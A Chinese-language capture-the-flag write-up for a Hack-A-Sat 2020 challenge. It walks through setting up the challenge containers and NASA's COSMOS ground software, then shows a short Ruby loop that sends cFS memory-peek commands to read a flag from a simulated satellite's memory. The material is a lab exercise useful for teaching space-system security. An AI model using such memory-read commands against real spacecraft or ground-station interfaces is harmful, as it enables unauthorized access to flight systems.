# 太空信息安全：利用 COSMOS 和 cFS 接口读取卫星内存【Hack A Sat】

> 原文: https://www.ctfiot.com/235623.html
> ID: 235623

直接用我的 github 仓库可以跳过环境配置这一大步：

https://github.com/yichen115/hackasat-qualifier-2020

题目环境

solver 文件夹内容修改

sed -i 's|deb.debian.org|mirrors.aliyun.com|g' /etc/apt/sources.list.d/debian.sources

pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

challenge 文件夹内容修改

sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list

题目环境编译与测试

解题

rm -rf data/*
docker run -it --rm -v `pwd`/data:/out -e "SEED=1" patch:
generator
socat -v tcp-listen:
19020,reuseaddr exec:"docker run --rm -i -e SERVICE_HOST=172.17.0.1 -e SERVICE_PORT=19021 -e SEED=1 -e FLAG=flag{60f46eee-8c85-4d8a-8bf9-bd1c6a8aa37d} -p 19021:
54321 patch:
challenge"

基础知识

https://ntrs.nasa.gov/api/citations/20210000619/downloads/20210000619%20Rev%201%20cFS_Training-COSMOS_Module.pdf

COSMOS 安装

git clone https://github.com/OpenC3/cosmos-project.git
openc3.bat run

sudo apt-add-repository -y ppa:
rael-gc/rvm
sudo apt update -y
sudo apt -y install rvm    //通过 rvm 来安装对应的 ruby 版本
source /usr/share/rvm/scripts/rvm
rvm install ruby-2.3.8 --disable-stable    //安装 2.3.8
rvm use 2.3.8 --default 
ruby -v
sudo apt-get install qt4-default   //安装 qt4
qmake --version                    //确认一下默认版本是不是 qt4
//给 gem 换个源
gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/
gem install bundler -v2.0.2    // 把 bundler 升级到 2.0 以上

export QT_X11_NO_MITSHM=1

INTERFACE LOCAL_CFS_INT tcpip_client_interface.rb 127.0.0.1 19021 19021 10 nil

日志分析

使用 COSMOS 读取 Flag

12.upto(212) { |off|
 offset = off
 cmd("MM PEEK_MEM with CCSDS_STREAMID 6280, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 73, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, DATA_SIZE 8, MEM_TYPE 1, PAD_16 0, ADDR_OFFSET #{offset}, ADDR_SYMBOL_NAME 'KitToFlagPkt'")
}

参考 WP


```
https://github.com/yichen115/hackasat-qualifier-2020
sed -i 's|deb.debian.org|mirrors.aliyun.com|g' /etc/apt/sources.list.d/debian.sources
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list
rm -rf data/*
docker run -it --rm -v `pwd`/data:/out -e "SEED=1" patch:
generator
socat -v tcp-listen:
19020,reuseaddr exec:"docker run --rm -i -e SERVICE_HOST=172.17.0.1 -e SERVICE_PORT=19021 -e SEED=1 -e FLAG=flag{60f46eee-8c85-4d8a-8bf9-bd1c6a8aa37d} -p 19021:
54321 patch:
challenge"
https://ntrs.nasa.gov/api/citations/20210000619/downloads/20210000619%20Rev%201%20cFS_Training-COSMOS_Module.pdf
git clone https://github.com/OpenC3/cosmos-project.git
openc3.bat run
sudo apt-add-repository -y ppa:
rael-gc/rvm
sudo apt update -y
sudo apt -y install rvm    //通过 rvm 来安装对应的 ruby 版本
source /usr/share/rvm/scripts/rvm
rvm install ruby-2.3.8 --disable-stable    //安装 2.3.8
rvm use 2.3.8 --default 
ruby -v
sudo apt-get install qt4-default   //安装 qt4
qmake --version                    //确认一下默认版本是不是 qt4
//给 gem 换个源
gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/
gem install bundler -v2.0.2    // 把 bundler 升级到 2.0 以上
export QT_X11_NO_MITSHM=1
INTERFACE LOCAL_CFS_INT tcpip_client_interface.rb 127.0.0.1 19021 19021 10 nil
12.upto(212) { |off|
 offset = off
 cmd("MM PEEK_MEM with CCSDS_STREAMID 6280, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 73, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, DATA_SIZE 8, MEM_TYPE 1, PAD_16 0, ADDR_OFFSET #{offset}, ADDR_SYMBOL_NAME 'KitToFlagPkt'")
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-c3be2e1fc19be3a60bb48636b68dcc14.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-9744b3c48624273b52189a1e26ae604f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-db64dcbc83e694b7159c3f8f9f835ef8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-4b4a0d093faab827641d2098d9c5c6c0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-39f65887e9990038a76183448b49a409.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-d6bea22c6756bc0de9f560d6762818dd.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-792c22c39dcb8d43c94911737be1530f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-501bdea42b6bd744179a9e5098aab62d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-97d607ed0cb9d32b25bcf72809088e63.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-438b5c95e0a7cda2f8851afd1d13ed06.png)